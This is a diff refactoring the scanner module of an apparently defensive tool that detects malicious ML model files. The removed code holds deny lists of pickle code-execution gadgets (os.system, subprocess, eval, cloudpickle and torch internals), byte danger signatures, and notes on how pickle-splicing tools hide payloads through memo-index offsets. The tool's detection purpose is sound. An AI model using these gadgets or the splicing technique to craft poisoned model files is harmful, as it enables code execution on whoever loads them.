@@ -25,14 +25,11 @@ from __future__ import annotations
 import ast
 import bz2
 import contextlib
-import dataclasses
 import io
 import json
 import logging
 import lzma
-import pickletools
 import re
-import reprlib
 import shutil
 import struct
 import subprocess
@@ -40,14 +37,166 @@ import tarfile
 import tempfile
 import zipfile
 import zlib
-from dataclasses import dataclass, field
+from collections.abc import Callable
+from concurrent.futures import ProcessPoolExecutor, as_completed
+from dataclasses import dataclass
 from enum import Enum
+from fnmatch import fnmatch
 from pathlib import Path
 from typing import Any
 
 from defusedxml.common import EntitiesForbidden
 
+# ── Facade re-exports (HW-147) ──────────────────────────────────────
+#
+# scanner.py was split into private sibling modules. The module-level helpers,
+# constants and dataclasses those modules now own are re-imported here so that
+# `from hayward.scanner import <name>` keeps resolving for every name the test
+# suite, cli.py and __init__.py rely on. The redundant `as` aliases mark these
+# as intentional re-exports (ruff F401 / mypy explicit re-export). The moved
+# code reads any test-tunable constants (pickle/keras/embedded-exec limits)
+# back off this module by attribute, so monkeypatching them here still steers
+# the extracted functions.
+from hayward._binary import _ELF_MACHINES as _ELF_MACHINES
+from hayward._binary import _MACHO_CPUTYPES as _MACHO_CPUTYPES
+from hayward._binary import _MACHO_MAGICS as _MACHO_MAGICS
+from hayward._binary import _find_embedded_executables as _find_embedded_executables
+from hayward._gguf import _GGML_TYPE_TRAITS as _GGML_TYPE_TRAITS
+from hayward._gguf import _GGUF_CHAT_TEMPLATE_SSTI_SIGNATURES as _GGUF_CHAT_TEMPLATE_SSTI_SIGNATURES
+from hayward._gguf import _GGUF_FIXED_TYPE_SIZES as _GGUF_FIXED_TYPE_SIZES
+from hayward._gguf import _GGUF_FREETEXT_KEYS as _GGUF_FREETEXT_KEYS
+from hayward._gguf import _GGUF_JINJA_BLOCK_RE as _GGUF_JINJA_BLOCK_RE
+from hayward._gguf import _GGUF_JINJA_STRING_RE as _GGUF_JINJA_STRING_RE
+from hayward._gguf import _GGUF_MAX_DIMS as _GGUF_MAX_DIMS
+from hayward._gguf import _GGUF_MAX_KEY_BYTES as _GGUF_MAX_KEY_BYTES
+from hayward._gguf import _GGUF_MAX_PLAUSIBLE_TYPE as _GGUF_MAX_PLAUSIBLE_TYPE
+from hayward._gguf import _GGUF_TYPE_ARRAY as _GGUF_TYPE_ARRAY
+from hayward._gguf import _GGUF_TYPE_STRING as _GGUF_TYPE_STRING
+from hayward._gguf import _U64 as _U64
+from hayward._gguf import GGML_MAGICS as GGML_MAGICS
+from hayward._gguf import GGUF_MAGIC as GGUF_MAGIC
+from hayward._gguf import GGUF_METADATA_SCAN_BYTES as GGUF_METADATA_SCAN_BYTES
+from hayward._gguf import _check_gguf_layout as _check_gguf_layout
+from hayward._gguf import _jinja_ssti_signature as _jinja_ssti_signature
+from hayward._gguf import _parse_gguf_metadata as _parse_gguf_metadata
+from hayward._gguf import _read_gguf_string as _read_gguf_string
+from hayward._gguf import _read_gguf_value as _read_gguf_value
+from hayward._keras import _KERAS_BUILTIN_LAYER_CLASSES as _KERAS_BUILTIN_LAYER_CLASSES
+from hayward._keras import _KERAS_CONFIG_ANCHOR as _KERAS_CONFIG_ANCHOR
+from hayward._keras import _KERAS_CONFIG_BACKTRACK as _KERAS_CONFIG_BACKTRACK
+from hayward._keras import _KERAS_CONFIG_WINDOW as _KERAS_CONFIG_WINDOW
+from hayward._keras import _KERAS_MAX_CONFIG_ANCHORS as _KERAS_MAX_CONFIG_ANCHORS
+from hayward._keras import _KERAS_STREAM_CHUNK as _KERAS_STREAM_CHUNK
+from hayward._keras import _balanced_brace_json_end as _balanced_brace_json_end
+from hayward._keras import _extract_keras_model_config as _extract_keras_model_config
+from hayward._keras import _find_keras_risky_layers as _find_keras_risky_layers
+from hayward._keras import _find_keras_unrecognized_classes as _find_keras_unrecognized_classes
+from hayward._keras import _read_keras_config_window as _read_keras_config_window
+from hayward._lfs import _LFS_OID_RE as _LFS_OID_RE
+from hayward._lfs import _LFS_PROBE_BYTES as _LFS_PROBE_BYTES
+from hayward._lfs import _LFS_SIZE_RE as _LFS_SIZE_RE
+from hayward._lfs import _LFS_VERSION_LINE as _LFS_VERSION_LINE
+from hayward._lfs import _lfs_pointer_finding as _lfs_pointer_finding
+from hayward._lfs import _parse_lfs_pointer as _parse_lfs_pointer
+from hayward._pickle_engine import _BYTES_PUSH_OPCODES as _BYTES_PUSH_OPCODES
+from hayward._pickle_engine import _EMBEDDED_PICKLE_MAX_DEPTH as _EMBEDDED_PICKLE_MAX_DEPTH
+from hayward._pickle_engine import _FLOAT_PUSH_OPCODES as _FLOAT_PUSH_OPCODES
+from hayward._pickle_engine import _INT_PUSH_OPCODES as _INT_PUSH_OPCODES
+from hayward._pickle_engine import _MAX_PICKLE_RESYNCS as _MAX_PICKLE_RESYNCS
+from hayward._pickle_engine import _MEMO_FETCH_OPCODES as _MEMO_FETCH_OPCODES
+from hayward._pickle_engine import _MEMO_INDEX_BAND_FACTOR as _MEMO_INDEX_BAND_FACTOR
+from hayward._pickle_engine import _MEMO_INDEX_BAND_FLOOR as _MEMO_INDEX_BAND_FLOOR
+from hayward._pickle_engine import _MEMO_INDEX_MAX_TRACKED as _MEMO_INDEX_MAX_TRACKED
+from hayward._pickle_engine import _MEMO_STORE_OPCODES as _MEMO_STORE_OPCODES
+from hayward._pickle_engine import _NESTED_PICKLE_OPENERS as _NESTED_PICKLE_OPENERS
+from hayward._pickle_engine import _OPAQUE_PUSH_OPCODES as _OPAQUE_PUSH_OPCODES
+from hayward._pickle_engine import _PICKLE_ALLOWED_ML_CLASS_ROOTS as _PICKLE_ALLOWED_ML_CLASS_ROOTS
+from hayward._pickle_engine import _PICKLE_ALLOWED_ML_EXACT as _PICKLE_ALLOWED_ML_EXACT
+from hayward._pickle_engine import (
+    _PICKLE_ALLOWED_STORAGE_PARENTS as _PICKLE_ALLOWED_STORAGE_PARENTS,
+)
+from hayward._pickle_engine import _PICKLE_ALLOWED_STRING_ARG_OK as _PICKLE_ALLOWED_STRING_ARG_OK
+from hayward._pickle_engine import _PICKLE_ARG_HOSTNAME_RE as _PICKLE_ARG_HOSTNAME_RE
+from hayward._pickle_engine import _PICKLE_ARG_PATH_RE as _PICKLE_ARG_PATH_RE
+from hayward._pickle_engine import _PICKLE_ARG_REPR as _PICKLE_ARG_REPR
+from hayward._pickle_engine import _PICKLE_ARG_SHELL_RE as _PICKLE_ARG_SHELL_RE
+from hayward._pickle_engine import _PICKLE_ARG_URL_RE as _PICKLE_ARG_URL_RE
+from hayward._pickle_engine import _PICKLE_CODE_OBJECT_BUILDERS as _PICKLE_CODE_OBJECT_BUILDERS
+from hayward._pickle_engine import _PICKLE_DENIED_ATTR_NAMES as _PICKLE_DENIED_ATTR_NAMES
+from hayward._pickle_engine import _PICKLE_DENIED_MODULES as _PICKLE_DENIED_MODULES
+from hayward._pickle_engine import _PICKLE_GENERIC_ATTR_NAMES as _PICKLE_GENERIC_ATTR_NAMES
+from hayward._pickle_engine import _PICKLE_MARK as _PICKLE_MARK
+from hayward._pickle_engine import _PICKLE_MAX_PARTIAL_TEXTS as _PICKLE_MAX_PARTIAL_TEXTS
+from hayward._pickle_engine import _PICKLE_MAX_SOURCE_PARSE_BYTES as _PICKLE_MAX_SOURCE_PARSE_BYTES
+from hayward._pickle_engine import _PICKLE_ML_CLASS_NAME_RE as _PICKLE_ML_CLASS_NAME_RE
+from hayward._pickle_engine import _PICKLE_OPAQUE as _PICKLE_OPAQUE
+from hayward._pickle_engine import _PICKLE_PATTERN_ARG_CALLABLES as _PICKLE_PATTERN_ARG_CALLABLES
+from hayward._pickle_engine import _PICKLE_PROTO0_GLOBAL_RE as _PICKLE_PROTO0_GLOBAL_RE
+from hayward._pickle_engine import _PICKLE_RESYNC_MARKERS as _PICKLE_RESYNC_MARKERS
+from hayward._pickle_engine import _PICKLE_STORAGE_NAME_RE as _PICKLE_STORAGE_NAME_RE
+from hayward._pickle_engine import _STRING_PUSH_OPCODES as _STRING_PUSH_OPCODES
+from hayward._pickle_engine import PICKLE_ALLOWED_GLOBALS as PICKLE_ALLOWED_GLOBALS
+from hayward._pickle_engine import PICKLE_DANGER_SIGNATURES as PICKLE_DANGER_SIGNATURES
+from hayward._pickle_engine import PICKLE_DENIED_GLOBALS as PICKLE_DENIED_GLOBALS
+from hayward._pickle_engine import PickleMemoProfile as PickleMemoProfile
+from hayward._pickle_engine import PickleResolvedCall as PickleResolvedCall
+from hayward._pickle_engine import (
+    _allowed_call_has_anomalous_string as _allowed_call_has_anomalous_string,
+)
+from hayward._pickle_engine import _classify_pickle_global as _classify_pickle_global
+from hayward._pickle_engine import (
+    _embedded_pickle_denied_globals as _embedded_pickle_denied_globals,
+)
+from hayward._pickle_engine import _is_denied_pickle_module as _is_denied_pickle_module
+from hayward._pickle_engine import _is_ml_constructor_allowed as _is_ml_constructor_allowed
+from hayward._pickle_engine import _is_pickle_literal as _is_pickle_literal
+from hayward._pickle_engine import _iter_pickle_arg_values as _iter_pickle_arg_values
+from hayward._pickle_engine import _iter_pickle_host_port_pairs as _iter_pickle_host_port_pairs
+from hayward._pickle_engine import _iter_pickle_source_targets as _iter_pickle_source_targets
+from hayward._pickle_engine import _laundered_denied_ref as _laundered_denied_ref
+from hayward._pickle_engine import _nested_pickle_evidence as _nested_pickle_evidence
+from hayward._pickle_engine import _nested_pickle_globals as _nested_pickle_globals
+from hayward._pickle_engine import _next_pickle_offset as _next_pickle_offset
+from hayward._pickle_engine import _pickle_arg_text as _pickle_arg_text
+from hayward._pickle_engine import _pickle_source_denied_target as _pickle_source_denied_target
+from hayward._pickle_engine import _pickle_stream_truncated as _pickle_stream_truncated
+from hayward._pickle_engine import _PickleCallResultType as _PickleCallResultType
+from hayward._pickle_engine import _PickleGlobalRef as _PickleGlobalRef
+from hayward._pickle_engine import _PickleMarkType as _PickleMarkType
+from hayward._pickle_engine import _PickleOpaqueType as _PickleOpaqueType
+from hayward._pickle_engine import _PickleWalkBudgetExceeded as _PickleWalkBudgetExceeded
+from hayward._pickle_engine import _pop_to_mark as _pop_to_mark
+from hayward._pickle_engine import _profile_memo_indices as _profile_memo_indices
+from hayward._pickle_engine import _propagate_result_invoked as _propagate_result_invoked
+from hayward._pickle_engine import _resolve_pickle_globals as _resolve_pickle_globals
+from hayward._pickle_engine import _triage_unknown_pickle_call as _triage_unknown_pickle_call
+from hayward._pickle_engine import _walk_one_pickle as _walk_one_pickle
+from hayward._tensors import _ONNX_ABSOLUTE_PATH_RE as _ONNX_ABSOLUTE_PATH_RE
+from hayward._tensors import _ONNX_EXTERNAL_DATA_KEYS as _ONNX_EXTERNAL_DATA_KEYS
+from hayward._tensors import _ONNX_REMOTE_LOCATION_RE as _ONNX_REMOTE_LOCATION_RE
+from hayward._tensors import _SAFETENSORS_DTYPE_SIZES as _SAFETENSORS_DTYPE_SIZES
+from hayward._tensors import _SAFETENSORS_MAX_TENSOR_BYTES as _SAFETENSORS_MAX_TENSOR_BYTES
+from hayward._tensors import _ST_METADATA_DANGEROUS_KEY_RE as _ST_METADATA_DANGEROUS_KEY_RE
+from hayward._tensors import _TFLITE_MAGIC as _TFLITE_MAGIC
+from hayward._tensors import _TFLITE_MAX_DIMS_PRODUCT_32 as _TFLITE_MAX_DIMS_PRODUCT_32
+from hayward._tensors import _TFLITE_MODEL_SUBGRAPHS as _TFLITE_MODEL_SUBGRAPHS
+from hayward._tensors import _TFLITE_SUBGRAPH_TENSORS as _TFLITE_SUBGRAPH_TENSORS
+from hayward._tensors import _TFLITE_TENSOR_SHAPE as _TFLITE_TENSOR_SHAPE
+from hayward._tensors import ONNX_DANGEROUS_OPS as ONNX_DANGEROUS_OPS
+from hayward._tensors import TF_DANGEROUS_OPS as TF_DANGEROUS_OPS
+from hayward._tensors import _check_safetensors_layout as _check_safetensors_layout
+from hayward._tensors import _check_tflite_layout as _check_tflite_layout
+from hayward._tensors import _extract_protobuf_strings as _extract_protobuf_strings
+from hayward._tensors import _fb_indirect as _fb_indirect
+from hayward._tensors import _fb_int_vector as _fb_int_vector
+from hayward._tensors import _fb_table_field as _fb_table_field
+from hayward._tensors import _iter_protobuf_fields as _iter_protobuf_fields
+from hayward._tensors import _onnx_external_data_maps as _onnx_external_data_maps
+from hayward._tensors import _read_varint as _read_varint
+from hayward._tensors import _string_string_entry as _string_string_entry
+from hayward._tensors import _unsafe_name_reason as _unsafe_name_reason
 from hayward.findings import Category, Finding, Severity
+from hayward.signatures import find_signature_artifacts, signature_findings
 
 logger = logging.getLogger(__name__)
 
@@ -55,1793 +204,42 @@ logger = logging.getLogger(__name__)
 # native-code loading if referenced by a pickle's GLOBAL/STACK_GLOBAL opcode
 # (regardless of whether __reduce__ actually invokes them via REDUCE/NEWOBJ --
 # a reference alone is enough evidence of tampering intent for a model file).
-PICKLE_DENIED_GLOBALS: frozenset[str] = frozenset({
-    "os.system", "posix.system", "nt.system",
-    "os.popen", "os.popen2", "os.popen3", "os.popen4",
-    "os.execl", "os.execle", "os.execlp", "os.execlpe",
-    "os.execv", "os.execve", "os.execvp", "os.execvpe",
-    "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
-    "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
-    "os.fork", "os.forkpty", "os.kill", "os.remove", "os.unlink", "os.rmdir",
-    "posix.execv", "posix.execve", "posix.fork", "posix.kill",
-    "posix.spawnv", "posix.spawnve",
-    "nt.spawnv", "nt.spawnve",
-    "subprocess.run", "subprocess.call", "subprocess.check_call",
-    "subprocess.check_output", "subprocess.Popen",
-    "builtins.eval", "builtins.exec", "builtins.compile",
-    "builtins.__import__",
-    "__builtin__.eval", "__builtin__.exec", "__builtin__.compile",
-    "__builtin__.__import__",
-    "runpy._run_code", "runpy.run_path", "runpy.run_module",
-    "pty.spawn",
-    "shutil.rmtree",
-    "ctypes.CDLL", "ctypes.PyDLL", "ctypes.WinDLL",
-    # ── Published gadgets carried by picklescan's _unsafe_globals ──
-    #
-    # Harvested from picklescan (MIT), whose list is in turn harvested from a
-    # decade of published research (Slaviero BlackHat 2011, ColdwaterQ DEFCON
-    # 2022, Trail of Bits' fickling, Rehberger's backdooring series). These
-    # are *known, documented* gadgets, and every one of them previously landed
-    # in the unknown bucket and was suppressed at INFO whenever it was
-    # referenced without an attack-shaped literal argument.
-    #
-    # That gap is worth stating plainly because it cuts against the argument
-    # for the argument-evidence tier below: evidence-based triage answers the
-    # gadget nobody has published yet, and it does nothing for the gadget
-    # everyone has published and we simply never listed. The two are
-    # complementary. A cloudpickle payload is the clearest case -- its
-    # argument is marshalled bytecode, not a command string, so no argument
-    # heuristic will ever fire on it and only the name identifies it.
-    #
-    # Deliberately NOT adopted from picklescan: `functools.partial`,
-    # `builtins.getattr` and the `operator.attrgetter/itemgetter/methodcaller`
-    # family. All three are genuinely common in legitimate pickles, and the
-    # re-triage below already reports the dynamic-resolution chains they
-    # enable at MEDIUM with the reason attached -- more precise than a flat
-    # CRITICAL. picklescan's whole-module wildcards were also left alone: its
-    # `uuid: *` entry reports an ordinary pickled `uuid.UUID` as a dangerous
-    # import, which is the precision cost of that mechanism.
-    "builtins.apply", "builtins.breakpoint", "builtins.open",
-    "__builtin__.apply", "__builtin__.breakpoint", "__builtin__.open",
-    "types.CodeType",
-    "_io.FileIO",
-    "logging.FileHandler",
-    "pkgutil.resolve_name",
-    "ensurepip._run_pip",
-    "doctest.debug_script",
-    "imaplib.IMAP4_stream",
-    "code.InteractiveInterpreter.runcode",
-    "trace.Trace.run", "trace.Trace.runctx",
-    # cloudpickle reconstructs live functions from marshalled code objects --
-    # arbitrary code execution by construction, and no model's weights need it.
-    #
-    # `_builtin_type` is the exception and is deliberately absent: it maps a
-    # name to a type object ("CodeType" -> types.CodeType) and executes
-    # nothing on its own. It appeared in 56 files of SafePickle's benign half,
-    # 140 of whose 144 flagged files relied on cloudpickle or torch internals
-    # with no sink anywhere in the stream. The companions below are what turn
-    # a code object into a callable, and they stay.
-    "cloudpickle.cloudpickle._function_setstate",
-    "cloudpickle.cloudpickle._make_cell",
-    "cloudpickle.cloudpickle._make_empty_cell",
-    "cloudpickle.cloudpickle._make_function",
-    "cloudpickle.cloudpickle.subimport",
-    # torch's own internals reachable from a checkpoint.
-    #
-    # `torch.storage._load_from_bytes` is deliberately absent. It is
-    # `torch.load(io.BytesIO(b), weights_only=False)`: a nested unrestricted
-    # load whose whole payload lives in the bytes literal `b`. It was denied
-    # outright because that inner stream was invisible to this walker, which
-    # made the deny the only way to see it at all.
-    #
-    # That justification expired when MFV-PICKLE-008 started walking bytes
-    # literals. The inner stream is now read directly, so the call is judged
-    # by what it actually carries rather than by its name. The old comment
-    # also claimed torch.save() never emits it, so real checkpoints were
-    # unaffected: SafePickle's benign half contains 115 files that do, because
-    # plain-pickling a tensor emits it too. Denying it unconditionally cost
-    # 115 false positives to catch payloads the nested walk now sees.
-    "torch.serialization.load",
-    "torch.utils.collect_env.run",
-    "torch._inductor.codecache.compile_file",
-    "torch.jit.unsupported_tensor_ops.execWrapper",
-    "torch._dynamo.guards.GuardBuilder.get",
-    "torch.fx.experimental.symbolic_shapes.ShapeEnv.evaluate_guards_expression",
-    "torch.utils._config_module.ConfigModule.load_config",
-    "torch.utils.bottleneck.__main__.run_autograd_prof",
-    "torch.utils.bottleneck.__main__.run_cprofile",
-    "torch.utils.data.datapipes.utils.decoder.basichandlers",
-    "lib2to3.pgen2.grammar.Grammar.loads",
-    "lib2to3.pgen2.pgen.ParserGenerator.make_label",
-    "idlelib.autocomplete.AutoComplete.fetch_completions",
-    "idlelib.autocomplete.AutoComplete.get_entity",
-    "idlelib.calltip.Calltip.fetch_tip",
-    "idlelib.calltip.get_entity",
-    "idlelib.debugobj.ObjectTreeItem.SetText",
-    "idlelib.pyshell.ModifiedInterpreter.runcode",
-    "idlelib.pyshell.ModifiedInterpreter.runcommand",
-    "idlelib.run.Executive.runcode",
-})
-
-# Fully-qualified globals routinely emitted by legitimate serialization of
-# built-in containers and common ML tensor/array formats. Referencing these
-# alone is not evidence of tampering.
-PICKLE_ALLOWED_GLOBALS: frozenset[str] = frozenset({
-    "collections.OrderedDict", "collections.defaultdict",
-    "collections.Counter", "collections.deque",
-    "builtins.set", "builtins.frozenset", "builtins.dict", "builtins.list",
-    "builtins.tuple", "builtins.bytearray", "builtins.complex",
-    # slice() builds a data object and cannot execute anything. It appears in
-    # ordinary sklearn and pandas pickles, and only became visible here once
-    # the walk learned to resync past raw array bytes.
-    "builtins.slice",
-    "__builtin__.set", "__builtin__.frozenset",
-    "copyreg._reconstructor", "copyreg.__newobj__", "copyreg.__newobj_ex__",
-    "_codecs.encode",
-    "numpy.core.multiarray._reconstruct", "numpy.core.multiarray.scalar",
-    "numpy._core.multiarray._reconstruct", "numpy._core.multiarray.scalar",
-    "numpy.ndarray", "numpy.dtype",
-    "torch._utils._rebuild_tensor", "torch._utils._rebuild_tensor_v2",
-    "torch._utils._rebuild_parameter", "torch._utils._rebuild_sparse_tensor",
-    "torch._utils._rebuild_meta_tensor_no_storage",
-    "torch.Size",
-    "torch.serialization._get_layout",
-})
-
-# Modules whose dtype-specific storage/tensor classes are treated as allowed
-# by name shape rather than exact match (they number in the dozens --
-# FloatStorage, BFloat16Storage, HalfTensor, ... -- and change across torch
-# versions, so an exhaustive list would be a maintenance trap).
+# ── Pickle engine tunables (kept here for the test facade) ─────────
 #
-# The parent module is matched *exactly*, not by prefix. The prefix form this
-# replaces (`ref.startswith("torch.") and ref.endswith("Storage")`) was a
-# wildcard over an attacker-controlled string: it allowlisted any name at any
-# depth of the torch namespace, so `torch.utils.collect_env.SomeTensor` or
-# `torch.<anything>.<anything>Storage` was waved through without ever being
-# classified. No weaponizable callable matching it was found in torch, but the
-# rule trusted far more of the namespace than the real class names occupy --
-# and the whole point of the unknown bucket is that we can't enumerate what
-# lives out there.
-_PICKLE_ALLOWED_STORAGE_PARENTS: frozenset[str] = frozenset({
-    "torch", "torch.cuda", "torch.storage",
-})
-# Leading `_` covers the private aliases torch has shipped (`_TypedStorage`);
-# the CapWords body is what keeps a lowercase function name from matching.
-_PICKLE_STORAGE_NAME_RE = re.compile(r"^_?[A-Z][A-Za-z0-9]*(?:Storage|Tensor)$")
-
-# ML frameworks whose namespaces carry no code-execution primitives, paired
-# with a class-shaped leaf (leading capital). The package prefix does the
-# safety work (no exec machinery lives in sklearn.*, scipy.*, transformers.*)
-# and the capital letter does the shape work: estimators, layers, dtypes and
-# config dataclasses are constructed at load, while the genuinely dangerous
-# members of these packages are all lowercase *functions* (dynamic-module
-# loading in transformers, file I/O in sklearn.datasets), which stay in the
-# unknown bucket where the argument-evidence triage sees them.
-# `torch` is deliberately NOT here: torch.utils.collect_env and friends are
-# dangerous submodules, and a CapWords leaf under one
-# (torch.utils.collect_env.SomethingTensor) must stay unknown. torch is
-# covered by the storage-parents rule and exact entries instead.
-# Evidence: every unknown global across the quickset benign corpus is
-# numpy/sklearn/scipy/joblib/torch/transformers machinery of exactly this
-# shape (measured 2026-08-04: 62 names, all class-shaped bar the exact
-# additions below).
-_PICKLE_ALLOWED_ML_CLASS_ROOTS: frozenset[str] = frozenset({
-    "sklearn", "scipy", "transformers",
-})
-_PICKLE_ML_CLASS_NAME_RE = re.compile(r"^_?[A-Z][A-Za-z0-9]*$")
-
-# Measured ordinary-ML machinery with lowercase leaves, so the class-shape
-# rule cannot cover it. Each is a type/constructor with no execution
-# surface, observed in the benign corpus.
-_PICKLE_ALLOWED_ML_EXACT: frozenset[str] = frozenset({
-    "numpy.float64", "numpy.random.mtrand.RandomState",
-    "torch.device", "argparse.Namespace",
-    "joblib.numpy_pickle.NumpyArrayWrapper", "scipy.sparse._csr.csr_matrix",
-})
-
-
-def _is_ml_constructor_allowed(ref: str) -> bool:
-    """True for refs allowlisted as ordinary ML constructors (class-shaped
-    leaves in the ML roots, or the exact lowercase-leaf additions). Used by
-    the classifier, and by the MFV-PICKLE-006 loop to skip them: config
-    objects take string arguments constantly (step names, output_dir, device
-    names), so the anomalous-string premise is false for the whole class."""
-    if ref in _PICKLE_ALLOWED_ML_EXACT:
-        return True
-    module, _, name = ref.rpartition(".")
-    root = module.partition(".")[0]
-    return root in _PICKLE_ALLOWED_ML_CLASS_ROOTS and bool(
-        _PICKLE_ML_CLASS_NAME_RE.match(name))
-
-# NOTE on a tier that was tried and deliberately left out: "the root module is
-# stdlib (per sys.stdlib_module_names) or bundled packaging tooling, therefore
-# suspicious". The reasoning was appealing -- gadget hunters source from
-# modules guaranteed present in the victim process, which is where `pip.main`,
-# `linecache`, `ssl` and `operator.attrgetter` all come from, and it needs no
-# hand-written list of bad names. Measured against ordinary pickles it does not
-# survive: `datetime.datetime`, `decimal.Decimal`, `uuid.UUID`,
-# `fractions.Fraction`, `re._compile`, `array._array_reconstructor` and
-# `functools.partial` are all unrecognized stdlib globals that legitimate
-# pickles construct constantly, so the tier fired on nearly every real file
-# while catching nothing the argument-level signals below did not already
-# catch. The stdlib is where the gadgets live *and* where the ordinary data
-# types live, and nothing observable in the opcode stream separates the two.
-
-# Bytes that commonly appear in malicious pickle payloads. Used ONLY as a
-# fallback when the opcode stream can't be parsed at all (corrupted/malformed
-# pickle) -- unlike opcode-based classification, a raw substring can't tell a
-# real dangerous call from an unrelated string, so it's kept out of the
-# primary (parseable) path entirely, which is where it used to cause false
-# positives on any *well-formed* pickle whose object happened to define
-# `__reduce__`/`__setstate__` (true of most custom classes). In the
-# unparseable-stream fallback specifically, that risk doesn't apply the same
-# way -- a stream we can't even walk as valid opcodes is already anomalous.
-PICKLE_DANGER_SIGNATURES: list[bytes] = [
-    b"os.system", b"subprocess", b"exec(", b"eval(",
-    b"__import__", b"posix\nsystem", b"nt\nsystem",
-    b"__reduce__", b"__setstate__", b"__getstate__",
-]
-
-# Opcodes that push a string constant onto the pickle VM stack -- the subset
-# of the pickle protocol _resolve_pickle_globals needs to track in order to
-# resolve STACK_GLOBAL's two preceding string pushes into `module.name`.
-_STRING_PUSH_OPCODES = frozenset({
-    "SHORT_BINUNICODE", "BINUNICODE", "BINUNICODE8", "UNICODE",
-    "SHORT_BINSTRING", "BINSTRING", "STRING",
-})
-# Opcodes that push a literal int/float/bytes constant -- needed (alongside
-# the string pushes above) to resolve REDUCE/NEWOBJ/NEWOBJ_EX call arguments
-# to concrete values instead of just the callable's name.
-_INT_PUSH_OPCODES = frozenset({"BININT", "BININT1", "BININT2", "LONG1", "LONG4", "INT", "LONG"})
-_FLOAT_PUSH_OPCODES = frozenset({"FLOAT", "BINFLOAT"})
-_BYTES_PUSH_OPCODES = frozenset({"SHORT_BINBYTES", "BINBYTES", "BINBYTES8", "BYTEARRAY8"})
-_MEMO_STORE_OPCODES = frozenset({"PUT", "BINPUT", "LONG_BINPUT"})
-_MEMO_FETCH_OPCODES = frozenset({"GET", "BINGET", "LONG_BINGET"})
-# Opcodes that push exactly one value whose identity this walk cannot resolve.
-# They must still push *something* -- see the handler in _walk_one_pickle for
-# why omitting the push is an exploitable stack desync rather than a cosmetic
-# gap.
-_OPAQUE_PUSH_OPCODES = frozenset({
-    "PERSID", "EXT1", "EXT2", "EXT4", "NEXT_BUFFER",
-})
-
-# ── Out-of-band memo indices ──────────────────────────────────────────
-#
-# Every Python pickler assigns memo indices densely and consecutively:
-# CPython's `Pickler.memoize` does `idx = len(self.memo)`, and
-# dill/cloudpickle/joblib inherit that because they subclass it. So the
-# indices one pickle writes always form a *single contiguous run* with no
-# holes in it.
-#
-# A large hole means the writer chose indices unrelated to the memo it was
-# actually filling. That is what pickle-splicing tools do so a spliced-in
-# memo write cannot clobber the host model's: ShadowPickle
-# (arXiv:2607.17503) rewrites every `BINPUT i` in its payload to
-# `LONG_BINPUT i + <constant>` for exactly this reason. The check below is on
-# the *hole*, never on a particular constant, so a splicer choosing a
-# different offset trips it identically.
-#
-# The measurement that matters is the ratio of the run's span
-# (`max - min + 1`) to the number of slots actually written, not the absolute
-# index. Absolute index is the wrong thing to threshold, because a `Pickler`
-# reused across many `dump()` calls carries its memo forward: shared across
-# 2000 five-slot dumps, a later sub-stream writes indices 4092-4102 while
-# owning only 11 slots. That is a legitimate stream with a large absolute
-# index and no hole, and an absolute-index rule reports it. Its span-to-slots
-# ratio is 1.0, the same as every other well-formed stream.
-#
-# Measured across 12 real pickle-bearing model files (7 in
-# benchmark/ground_truth/clean_models plus 8 in picklebench's model-cache,
-# covering torch zip, torch legacy, raw and zlib joblib, and sklearn with
-# custom classes) and 60 synthetic `pickle.dumps` streams (protocols 0-5
-# across recursive structures, shared references, custom
-# `__reduce__`/`__getstate__` classes, 20k-key dicts, bytes and set-heavy
-# containers): the ratio was exactly 1.0 in every single case, with no
-# exceptions. The largest legitimate span seen was 907 slots
-# (tiny-random-t5's state_dict), and the largest legitimate absolute index
-# 906.
-#
-# FACTOR is how many times its own slot count a stream's span has to reach
-# before the hole counts as evidence: 64x headroom over an observed ratio
-# that never left 1.0. FLOOR keeps the ratio from firing on tiny streams,
-# where a handful of slots makes it noisy; at 4096 it is 4.5x the largest
-# absolute index any real model here produced, and it only binds below 64
-# slots (above that, slots * FACTOR is larger).
-_MEMO_INDEX_BAND_FACTOR = 64
-_MEMO_INDEX_BAND_FLOOR = 4096
-
-# Cap on distinct memo indices tracked per pickle. Indices are recorded even
-# when the simulated stack is empty (an index written by a spliced block is
-# evidence about the writer regardless), and that is the one path that used to
-# cost nothing at all -- 500MB of bare `LONG_BINPUT` opcodes is 100M distinct
-# indices and several GB of set. Past this bound the pickle stops being
-# profiled: a stream with a million memo slots is not the shape this check
-# looks for anyway, since its own slot count would put the threshold above any
-# hole in it. Set 1000x above the largest real model measured here (907 slots).
-_MEMO_INDEX_MAX_TRACKED = 1_000_000
-
-
-@dataclass(frozen=True)
-class PickleMemoProfile:
-    """How one pickle stream used the unpickler's memo.
-
-    `slots` counts distinct memo indices written to, `max_index` is the
-    highest (-1 when nothing was memoized), and `out_of_band` holds the
-    indices sitting past a disproportionate hole in the run. `out_of_band` is
-    empty for every well-formed stream.
-    """
-    slots: int
-    max_index: int
-    out_of_band: tuple[int, ...]
-
-
-def _profile_memo_indices(indices: set[int]) -> PickleMemoProfile:
-    """Summarize the memo indices one pickle stored into, flagging a hole in
-    the run that is disproportionate to the memo actually in use.
-
-    The threshold is derived from the observed slot count rather than fixed,
-    so it scales with the host model: an 814-slot BERT state_dict and a
-    5-slot toy pickle are both judged against a bounded multiple of their own
-    memo size. Takes the distinct indices as a set so a stream that writes the
-    same slot a million times costs no more to profile than the memo dict
-    already being simulated alongside it.
-    """
-    if not indices:
-        return PickleMemoProfile(0, -1, ())
-    ordered = sorted(indices)
-    span = ordered[-1] - ordered[0] + 1
-    if span < max(_MEMO_INDEX_BAND_FLOOR, len(ordered) * _MEMO_INDEX_BAND_FACTOR):
-        return PickleMemoProfile(len(ordered), ordered[-1], ())
-    # There is a hole big enough to be evidence. Split the run at its widest
-    # gap and report everything above it: that is the spliced block's band,
-    # with the host model's own band left below.
-    widest = max(range(len(ordered) - 1), key=lambda i: ordered[i + 1] - ordered[i])
-    return PickleMemoProfile(len(ordered), ordered[-1], tuple(ordered[widest + 1:]))
-
-
-class _PickleMarkType:
-    """Sentinel for the pickle VM's MARK opcode on the simulated stack.
-
-    The real ``Unpickler`` keeps a separate "metastack" so MARK effectively
-    starts a fresh sub-stack; here a single flat list is used instead with
-    this sentinel marking where the mark was pushed, popped by
-    ``_pop_to_mark`` -- behaviorally equivalent, simpler to reason about
-    alongside the rest of this walk.
-    """
-    __slots__ = ()
-
-    def __repr__(self) -> str:
-        return "<PICKLE-MARK>"
-
-
-class _PickleOpaqueType:
-    """Sentinel for a simulated stack value this walker can't resolve: the
